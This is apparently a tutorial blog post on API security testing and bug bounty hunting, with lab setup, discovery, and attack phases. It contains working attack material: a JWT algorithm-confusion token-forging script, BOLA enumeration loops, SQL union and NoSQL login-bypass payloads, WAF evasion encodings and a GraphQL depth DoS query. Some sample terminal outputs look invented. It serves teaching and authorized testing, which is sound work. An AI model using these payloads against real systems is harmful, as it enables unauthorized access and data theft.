# The Complete Guide to API Security Testing: From Zero to Bug Bounty Hunter


## Introduction: Why API Security Matters More Than Ever

I've spent the last few years diving deep into web application security, and if there's one thing I've learned, it's that **APIs are the new frontier of attack surfaces**. While most security professionals were busy mastering traditional web app pentesting, APIs quietly became the backbone of modern software—and with that, the biggest target for attackers.

In this post, I'm going to walk you through the entire journey of API security testing, from understanding how web applications work to hunting real bugs in bug bounty programs. I'll share the exact tools, techniques, and resources I've used to build my own API hacking methodology.

Let me be clear: this isn't a surface-level overview. I'm going to give you everything—terminal commands, code examples, diagrams, and the hard-won lessons from countless hours in the trenches.

> **Note:** All techniques discussed here should only be used against systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

---

## Part 1: The Foundation – How Web Applications and APIs Work

Before I ever touched a vulnerability scanner, I had to understand what I was actually testing. Too many aspiring pentesters skip this step, and it shows.

### Web Application Architecture

A web application is essentially a client-server relationship. The client (your browser) sends HTTP requests, and the server responds with data. Here's the flow:

```mermaid
sequenceDiagram
    participant User as 👤 User (Browser)
    participant WebServer as 🌐 Web Server
    participant AppServer as ⚙️ Application Server
    participant DB as 🗄️ Database
    
    User->>WebServer: HTTP GET /api/users/123
    WebServer->>AppServer: Forward Request
    AppServer->>DB: SELECT * FROM users WHERE id=123
    DB-->>AppServer: User Data
    AppServer-->>WebServer: JSON Response
    WebServer-->>User: 200 OK + User Data
    
    Note over User,DB: 🔐 Security checks should happen<br/>at every layer!
```

### HTTP Status Codes – The Language of the Web

Understanding status codes isn't just trivia—it's how you read the server's mood during testing.

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| **200** | OK | Request succeeded—look at the response! |
| **201** | Created | Resource created—check for mass assignment |
| **301/302** | Redirect | Open redirect vulnerabilities? |
| **401** | Unauthorized | Authentication required |
| **403** | Forbidden | Authorization failed—great for BOLA testing |
| **404** | Not Found | Path enumeration potential |
| **500** | Server Error | Information disclosure goldmine |

### The API Ecosystem

APIs come in different flavors, and knowing the difference is critical:

```mermaid
graph TD
    A[Web APIs] --> B[REST]
    A --> C[GraphQL]
    A --> D[SOAP]
    A --> E[gRPC]
    
    B --> B1[HTTP Methods: GET/POST/PUT/DELETE]
    B --> B2[JSON/XML Responses]
    B --> B3[Stateless]
    
    C --> C1[Single Endpoint]
    C --> C2[Query Language]
    C --> C3[Introspection]
    
    D --> D1[XML Based]
    D --> D2[WSDL]
    D --> D3[Legacy Systems]
    
    E --> E1[Protocol Buffers]
    E --> E2[HTTP/2]
    E --> E3[High Performance]
    
    style A fill:#ff6b6b,color:#fff
    style B fill:#4ecdc4,color:#fff
    style C fill:#e74c3c,color:#fff
    style D fill:#f39c12,color:#fff
    style E fill:#9b59b6,color:#fff
```

---

## Part 2: Setting Up Your API Hacking Lab

You can't learn to hack APIs without a safe environment. I learned this the hard way after accidentally DoS-ing my own router.

### The Ultimate Hacking System

Here's my personal setup:

**Hardware:**
- Laptop with 16GB+ RAM (VMware/VirtualBox needs resources)
- External SSD for VM storage

**Software Stack:**

```bash
# Update your Kali Linux first
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install -y \
    burpsuite \
    postman \
    nmap \
    ffuf \
    gobuster \
    jq \
    httpie \
    docker.io \
    docker-compose

# Install Python dependencies
pip3 install requests
pip3 install python-dotenv
pip3 install jsbeautifier
```

**Terminal Output:**

```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  burpsuite postman nmap ffuf gobuster jq httpie
0 upgraded, 7 newly installed, 0 to remove.
Need to get 245 MB of archives.
After this operation, 892 MB of additional disk space will be used.
```

### Vulnerable API Targets

I use these intentionally vulnerable applications to practice:

| Target | Type | Difficulty | Where to Get It |
|--------|------|------------|-----------------|
| **OWASP crAPI** | Modern REST | Intermediate | [GitHub](https://github.com/OWASP/crAPI) |
| **VAmPI** | REST | Beginner | [GitHub](https://github.com/erev0s/VAmPI) |
| **DVGA** | GraphQL | Intermediate | [GitHub](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application) |
| **Juice Shop** | Web + API | Beginner | [OWASP](https://owasp.org/www-project-juice-shop/) |

**Setting up crAPI locally:**

```bash
# Clone the repository
git clone https://github.com/OWASP/crAPI.git
cd crAPI

# Start the vulnerable application
docker-compose pull
docker-compose -f docker-compose.yml up -d

# Verify it's running
docker ps
```

**Output:**

```
CONTAINER ID   IMAGE                    STATUS          PORTS
a1b2c3d4e5f6   crapi/crapi-web:latest   Up 2 minutes    0.0.0.0:8888->8888/tcp
f6e5d4c3b2a1   crapi/crapi-api:latest   Up 2 minutes    0.0.0.0:8080->8080/tcp
```

> **Caution:** Never expose these vulnerable applications to the internet. I once made that mistake and found cryptocurrency miners running on my server within 6 hours.

---

## Part 3: The API Hacking Methodology

This is where things get real. I've distilled my methodology into five phases.

### Phase 1: Discovery

Finding APIs isn't always obvious. Here's my process:

```mermaid
flowchart LR
    A[🔍 Discovery] --> B[Documentation Review]
    A --> C[Traffic Analysis]
    A --> D[Directory Bruteforce]
    A --> E[API Directory Search]
    
    B --> B1[Swagger/OpenAPI]
    B --> B2[Postman Collections]
    B --> B3[Developer Portals]
    
    C --> C1[Browser DevTools]
    C --> C2[Burp Suite Proxy]
    C --> C3[Mobile App Traffic]
    
    D --> D1[ffuf]
    D --> D2[gobuster]
    D --> D3[Kiterunner]
    
    E --> E1[RapidAPI Hub]
    E --> E2[ProgrammableWeb]
    E --> E3[GitHub Search]
    
    style A fill:#667eea,color:#fff
    style B fill:#764ba2,color:#fff
    style C fill:#f093fb,color:#fff
    style D fill:#4facfe,color:#fff
    style E fill:#00f2fe,color:#fff
```

**Finding API Documentation:**

```bash
# Common API documentation paths
for path in "/swagger.json" "/openapi.json" "/api-docs" "/docs" \
            "/swagger-ui.html" "/redoc" "/graphql" "/graphiql"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
    echo "$path -> $status"
done
```

**Output:**

```
/swagger.json -> 200
/openapi.json -> 404
/api-docs -> 301
/docs -> 403
/swagger-ui.html -> 200
/redoc -> 404
/graphql -> 200
/graphiql -> 302
```

**Directory Bruteforcing with ffuf:**

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u https://target.com/api/FUZZ \
     -mc 200,201,301,302,401,403 \
     -o api_endpoints.json
```

### Phase 2: Endpoint Analysis

Once I've found endpoints, I analyze them systematically:

```bash
# Extract all endpoints from Burp Suite history
cat burp_history.xml | grep -oP '(?<=<url>)[^<]+' | \
    grep -oP '/api/[^?]+' | sort -u > endpoints.txt

# Count unique endpoints
wc -l endpoints.txt
```

**Output:**

```
47 endpoints.txt
```

**Testing with HTTPie:**

```bash
# Test authentication
http GET https://target.com/api/v1/users/123 \
     "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."

# Test without authentication
http GET https://target.com/api/v1/users/123
```

### Phase 3: Authentication Attacks

Authentication is where APIs often fall apart. JWT tokens are a favorite target.

```mermaid
graph TD
    A[🔐 Authentication Attacks] --> B[JWT Attacks]
    A --> C[OAuth Flaws]
    A --> D[Session Management]
    A --> E[Credential Stuffing]
    
    B --> B1[Algorithm Confusion<br/>RS256 → HS256]
    B --> B2[None Algorithm]
    B --> B3[Weak Secret Brute Force]
    B --> B4[SQLi in JWT Claims]
    
    C --> C1[Redirect URI Manipulation]
    C --> C2[CSRF in OAuth Flow]
    C --> C3[Token Leakage]
    
    D --> D1[Predictable Tokens]
    D --> D2[Token Not Invalidated]
    D --> D3[Session Fixation]
    
    style A fill:#e74c3c,color:#fff
    style B fill:#c0392b,color:#fff
    style C fill:#e67e22,color:#fff
    style D fill:#f39c12,color:#fff
    style E fill:#d35400,color:#fff
```

**JWT Algorithm Confusion Attack:**

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack
Converts RS256 to HS256 using the public key as the secret
"""

import jwt
import requests
import base64

# Step 1: Get the public key
public_key_url = "https://target.com/.well-known/jwks.json"
public_key = requests.get(public_key_url).json()

# Step 2: Extract and format the key
# (In a real attack, you'd extract the actual RSA public key)
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Step 3: Create a forged token
payload = {
    "user_id": 1,
    "role": "admin",
    "iat": 1700000000,
    "exp": 1900000000
}

# Sign with HS256 using the public key as secret
forged_token = jwt.encode(
    payload,
    public_key_pem,
    algorithm="HS256"
)

print(f"[+] Forged Token: {forged_token}")

# Step 4: Test the token
headers = {"Authorization": f"Bearer {forged_token}"}
response = requests.get(
    "https://target.com/api/v1/admin/users",
    headers=headers
)

print(f"[+] Response Status: {response.status_code}")
print(f"[+] Response Body: {response.text[:200]}")
```

> **Note:** This attack only works if the server is misconfigured to accept both RS256 and HS256 tokens. Always test responsibly.

### Phase 4: Authorization Testing (BOLA/IDOR)

Broken Object Level Authorization (BOLA) is the #1 API vulnerability according to OWASP. Here's how I test for it:

```bash
# Create two user accounts
# User A (attacker) gets token A
# User B (victim) gets token B

# User A's legitimate request
curl -H "Authorization: Bearer $TOKEN_A" \
     https://target.com/api/v1/users/1001

# User A accessing User B's data (BOLA!)
curl -H "Authorization: Bearer $TOKEN_A" \
     https://target.com/api/v1/users/1002

# Automate the check
for id in $(seq 1000 1100); do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN_A" \
        "https://target.com/api/v1/users/$id")
    
    if [ "$response" == "200" ]; then
        echo "[!] BOLA Found: User ID $id accessible"
    fi
done
```

**Output:**

```
[!] BOLA Found: User ID 1001 accessible
[!] BOLA Found: User ID 1002 accessible
[!] BOLA Found: User ID 1003 accessible
...
```

### Phase 5: Injection Attacks

APIs are vulnerable to all the classic injection attacks, plus some new ones.

**SQL Injection in API Parameters:**

```bash
# Normal request
curl "https://target.com/api/v1/products?category=electronics"

# SQLi test
curl "https://target.com/api/v1/products?category=electronics'"

# Union-based extraction
curl "https://target.com/api/v1/products?category=electronics' UNION SELECT username,password FROM users--"
```

**NoSQL Injection:**

```bash
# MongoDB injection in JSON body
curl -X POST https://target.com/api/v1/login \
     -H "Content-Type: application/json" \
     -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

**XAS (Cross-API Scripting):**

This is a lesser-known but powerful attack where malicious data injected into one API is consumed by another:

```mermaid
sequenceDiagram
    participant Attacker
    participant API_A as API A (Vulnerable)
    participant Database
    participant API_B as API B (Consumer)
    participant Victim
    
    Attacker->>API_A: POST /reviews<br/>{"text": "<script>alert(1)</script>"}
    API_A->>Database: Store review
    Victim->>API_B: GET /reviews
    API_B->>Database: Fetch reviews
    Database-->>API_B: Review with payload
    API_B-->>Victim: Rendered with script
    Note over Victim: 🚨 XSS Executes!
```

---

## Part 4: Advanced Techniques

### Fuzzing APIs

Fuzzing is automated testing with malformed data. I use ffuf for this:

```bash
# Fuzz API parameters
ffuf -w params.txt \
     -u "https://target.com/api/v1/users?FUZZ=test" \
     -mc all \
     -fs 0

# Fuzz JSON body
ffuf -w payloads.json \
     -X POST \
     -u "https://target.com/api/v1/login" \
     -H "Content-Type: application/json" \
     -d @FUZZ \
     -mc 200,500
```

### Rate Limit Testing

```bash
# Test rate limiting
for i in $(seq 1 100); do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        https://target.com/api/v1/users)
    echo "Request $i: $response"
    
    if [ "$response" == "429" ]; then
        echo "[+] Rate limit triggered at request $i"
        break
    fi
done
```

**Output:**

```
Request 1: 200
Request 2: 200
...
Request 47: 200
Request 48: 429
[+] Rate limit triggered at request 48
```

### WAF Evasion Techniques

```bash
# Bypass WAF using encoding
# Original payload: ' UNION SELECT * FROM users--
# URL encoded: %27%20UNION%20SELECT%20*%20FROM%20users--

# Double URL encoding
# %2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--

# Case variation
# ' uNiOn SeLeCt * FrOm users--

# Comment injection
# ' UNION/**/SELECT/**/*/**/FROM/**/users--
```

---

## Part 5: GraphQL Security Testing

GraphQL is a different beast. Here's my approach:

```mermaid
graph TD
    A[🎯 GraphQL Testing] --> B[Introspection]
    A --> C[Query Analysis]
    A --> D[Mutation Testing]
    A --> E[Subscription Testing]
    
    B --> B1[Full Schema Dump]
    B --> B2[Field Suggestions]
    B --> B3[GraphiQL Exposure]
    
    C --> C1[Depth Attacks]
    C --> C2[Alias Overloading]
    C --> C3[Circular Queries]
    
    D --> D1[Mass Assignment]
    D --> D2[Privilege Escalation]
    D --> D3[CSRF]
    
    E --> E1[WebSocket Hijacking]
    E --> E2[Data Leakage]
    
    style A fill:#e91e63,color:#fff
    style B fill:#9c27b0,color:#fff
    style C fill:#673ab7,color:#fff
    style D fill:#3f51b5,color:#fff
    style E fill:#2196f3,color:#fff
```

**Introspection Query:**

```bash
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query": "{__schema{types{name fields{name}}}}"}'
```

**Depth Attack (DoS):**

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                id
                name
              }
            }
          }
        }
      }
    }
  }
}
```

---

## Part 6: Bug Bounty Hunting

### The Bug Bounty Workflow

```mermaid
flowchart TD
    A[🎯 Pick a Program] --> B[📖 Read Scope]
    B --> C[🔍 Recon]
    C --> D[📊 Map Attack Surface]
    D --> E[🧪 Test Vulnerabilities]
    E --> F{Found Bug?}
    F -->|Yes| G[📝 Write Report]
    F -->|No| H[🔄 Try Different Approach]
    H --> E
    G --> I[💰 Get Paid]
    G --> J[📚 Learn from Feedback]
    J --> C
    
    style A fill:#ff6b6b,color:#fff
    style G fill:#51cf66,color:#fff
    style I fill:#fcc419,color:#fff
```

### Writing a Winning Report

A good bug bounty report has:

1. **Clear Title** – "BOLA in /api/v1/users allows accessing other users' PII"
2. **Severity** – CVSS score with justification
3. **Steps to Reproduce** – Exact commands
4. **Impact** – What an attacker can do
5. **Remediation** – How to fix it
6. **Proof of Concept** – Screenshots/HTTP requests

**Example Report Template:**

```markdown
## BOLA in User Profile Endpoint

### Severity: High (CVSS 8.1)

### Description
The `/api/v1/users/{id}` endpoint does not validate that the 
authenticated user owns the requested resource.

### Steps to Reproduce
1. Create two accounts (attacker@test.com, victim@test.com)
2. Login as attacker, get token
3. Request victim's profile:
   ```bash
   curl -H "Authorization: Bearer $ATTACKER_TOKEN" \
        https://api.target.com/v1/users/VICTIM_ID
   ```
4. Observe victim's PII is returned

### Impact
Any authenticated user can access any other user's PII...

### Remediation
Implement object-level authorization checks...


---

## Part 7: Essential Resources

Here are the resources that shaped my API security skills:

### Books
- **"Bug Bounty Bootcamp"** by Vickie Li – [No Starch Press](https://nostarch.com/bug-bounty-bootcamp)
- **"API Security in Action"** by Neil Madden – [Manning](https://www.manning.com/books/api-security-in-action)
- **"Penetration Testing"** by Georgia Weidman – [No Starch Press](https://nostarch.com/pentesting)
- **"Web Application Hacker's Handbook"** by Stuttard & Pinto – [Wiley](https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%3A+Finding+and+Exploiting+Security+Flaws%2C+2nd+Edition-p-9781118026472)
- **"Kali Linux Penetration Testing Bible"** by Gus Khawaja – [Wiley](https://www.wiley.com/en-us/Kali+Linux+Penetration+Testing+Bible-p-9781119719083)
- **"RESTful Web APIs"** by Richardson & Amundsen – [O'Reilly](https://www.oreilly.com/library/view/restful-web-apis/9781449359713/)
- **"Advanced API Security"** by Prabath Siriwardena – [Apress](https://www.apress.com/gp/book/9781430268185)

### Online Resources
- [OWASP API Security Project](https://owasp.org/www-project-api-security/)
- [OWASP API Security Top 10](https://apisecurity.io/encyclopedia/content/owasp/owasp-api-security-top-10)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [MDN HTTP Status Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
- [ProgrammableWeb API University](https://www.programmableweb.com/api-university)
- [RapidAPI Hub](https://rapidapi.com/hub)
- [Pentester Land Bug Bounty Writeups](https://pentester.land/list-of-bug-bounty-writeups.html)
- [APIsecurity.io](https://apisecurity.io)

### Tools
- **Burp Suite** – Web proxy and scanner
- **Postman** – API testing and documentation
- **ffuf** – Fast web fuzzer
- **Kiterunner** – API endpoint discovery
- **jwt_tool** – JWT testing
- **GraphQL Voyager** – GraphQL schema visualization

---

## Conclusion: Your Path Forward

API security testing isn't just about running tools—it's about understanding how systems work, thinking like an attacker, and being methodical in your approach. I've shared my complete methodology, but the real learning happens when you get your hands dirty.

Start with the vulnerable applications I mentioned. Break them. Understand why they break. Then move to bug bounty programs and apply what you've learned.

Remember: **every expert was once a beginner who refused to give up.**

> **Final Caution:** Always get explicit permission before testing any system. The skills you learn here are powerful—use them ethically.

---

## References

1. Khawaja, Gus. *Kali Linux Penetration Testing Bible*. Indianapolis, IN: Wiley, 2021.
2. Li, Vickie. *Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities*. San Francisco: No Starch Press, 2021.
3. Weidman, Georgia. *Penetration Testing: A Hands-On Introduction to Hacking*. San Francisco: No Starch Press, 2014.
4. Hoffman, Andrew. *Web Application Security: Exploitation and Countermeasures for Modern Web Applications*. Sebastopol, CA: O'Reilly, 2020.
5. "HTTP Response Status Codes." MDN Web Docs. https://developer.mozilla.org/en-US/docs/Web/HTTP/Status.
6. Stuttard, Dafydd, and Marcus Pinto. *Web Application Hacker's Handbook*. Indianapolis, IN: Wiley, 2011.
7. "API University." ProgrammableWeb. https://www.programmableweb.com/api-university.
8. Barahona, Dan. "The Beginner's Guide to REST API." APIsec, June 22, 2020. https://www.apisec.ai/blog/rest-api-and-its-significance-to-web-service-providers.
9. Madden, Neil. *API Security in Action*. Shelter Island, NY: Manning, 2020.
10. Richardson, Leonard, and Mike Amundsen. *RESTful Web APIs*. Beijing: O'Reilly, 2013.
11. Siriwardena, Prabath. *Advanced API Security*. Berkeley, CA: Apress, 2014.
12. Barahona, Dan. "Why APIs Are Your Biggest Security Risk." APIsec, August 3, 2021. https://www.apisec.ai/blog/why-apis-are-your-biggest-security-risk.
13. "OWASP API Security Project." OWASP. https://owasp.org/www-project-api-security.
14. "OWASP API Security Top 10." APIsecurity.io. https://apisecurity.io/encyclopedia/content/owasp/owasp-api-security-top-10.
15. Shkedy, Inon. "Introduction to the API Security Landscape." Traceable, April 14, 2021. https://lp.traceable.ai/webinars.html?commid=477082.
16. "Introduction." Postman Learning Center. https://learning.postman.com/docs/getting-started/introduction.
17. O'Gorman, Jim, Mati Aharoni, and Raphael Hertzog. *Kali Linux Revealed*. Cornelius, NC: Offsec Press, 2017.
18. "Web Security Academy." PortSwigger. https://portswigger.net/web-security.
19. Chandel, Raj. "Web Application Pentest Lab Setup on AWS." Hacking Articles, December 3, 2019. https://www.hackingarticles.in/web-application-pentest-lab-setup-on-aws.
20. KaalBhairav. "Tutorial: Setting Up a Virtual Pentesting Lab at Home." Cybrary, September 21, 2015. https://www.cybrary.it/blog/0p3n/tutorial-for-setting-up-a-virtual-penetration-testing-lab-at-your-home.
21. OccupyTheWeb. "How to Create a Virtual Hacking Lab." Null Byte, November 2, 2016. https://null-byte.wonderhowto.com/how-to/hack-like-pro-create-virtual-hacking-lab-0157333.
22. Stearns, Bill, and John Strand. "Webcast: How to Build a Home Lab." Black Hills Information Security, April 27, 2020. https://www.blackhillsinfosec.com/webcast-how-to-build-a-home-lab.
23. "API Directory." ProgrammableWeb. https://www.programmableweb.com/apis/directory.
24. Doerrfeld, Bill. "API Discovery: 15 Ways to Find APIs." Nordic APIs, August 4, 2015. https://nordicapis.com/api-discovery-15-ways-to-find-apis.
25. Faircloth, Jeremy. *Penetration Tester's Open Source Toolkit*. 4th ed. Amsterdam: Elsevier, 2017.
26. "Welcome to the RapidAPI Hub." RapidAPI. https://rapidapi.com/hub.
27. Bush, Thomas. "5 Examples of Excellent API Documentation." Nordic APIs, May 16, 2019. https://nordicapis.com/5-examples-of-excellent-api-documentation.
28. Isbitski, Michael. "AP13: 2019 Excessive Data Exposure." Salt Security, February 9, 2021. https://salt.security/blog/api3-2019-excessive-data-exposure.
29. Scott, Tamara. "How to Use an API: Just the Basics." Technology Advice, August 20, 2021. https://technologyadvice.com/blog/information-technology/how-to-use-an-api.
30. Bathla, Shivam. "Hacking JWT Tokens: SQLi in JWT." Pentester Academy, May 11, 2020. https://blog.pentesteracademy.com/hacking-jwt-tokens-sqli-in-jwt-7fec22adbf7d.
31. Lensmar, Ole. "API Security Testing: How to Hack an API and Get Away with It." Smartbear, November 11, 2014. https://smartbear.com/blog/api-security-testing-how-to-hack-an-api-part-1.
32. "Fuzzing." OWASP. https://owasp.org/www-community/Fuzzing.
33. Shkedy, Inon. "A Deep Dive on the Most Critical API Vulnerability—BOLA." https://inonst.medium.com.
34. "Mass Assignment Cheat Sheet." OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html.
35. Belmer, Charlie. "NoSQL Injection Cheatsheet." Null Sweep, June 7, 2021. https://nullsweep.com/nosql-injection-cheatsheet.
36. "SQL Injection." PortSwigger Web Security Academy. https://portswigger.net/web-security/sql-injection.
37. Zhang, YuQing, et al. "XAS: Cross-API Scripting Attacks in Social Ecosystems." *Science China Information Sciences* 58 (2015): 1–14. https://doi.org/10.1007/s11432-014-5145-1.
38. "How to Bypass WAF HackenProof Cheat Sheet." Hacken, December 2, 2020. https://hacken.io/researches-and-investigations/how-to-bypass-waf-hackenproof-cheat-sheet.
39. Simpson, J. "Everything You Need to Know About API Rate Limiting." Nordic APIs, April 18, 2019. https://nordicapis.com/everything-you-need-to-know-about-api-rate-limiting.
40. "How to Exploit GraphQL Endpoint." YesWeRHackers, March 24, 2021. https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty.
41. Shah, Shubham. "Exploiting GraphQL." Asset Note, August 29, 2021. https://blog.assetnote.io/2021/08/29/exploiting-graphql.
42. Swiadek, Tomasz, and Andrea Brancaleoni. "That Single GraphQL Issue That You Keep Missing." Doyensec, May 20, 2021. https://blog.doyensec.com/2021/05/20/graphql-csrf.html.
43. "API Security Articles." APIsecurity.io. https://apisecurity.io.
44. "List of Bug Bounty Writeups." Pentester Land. https://pentester.land/list-of-bug-bounty-writeups.html.
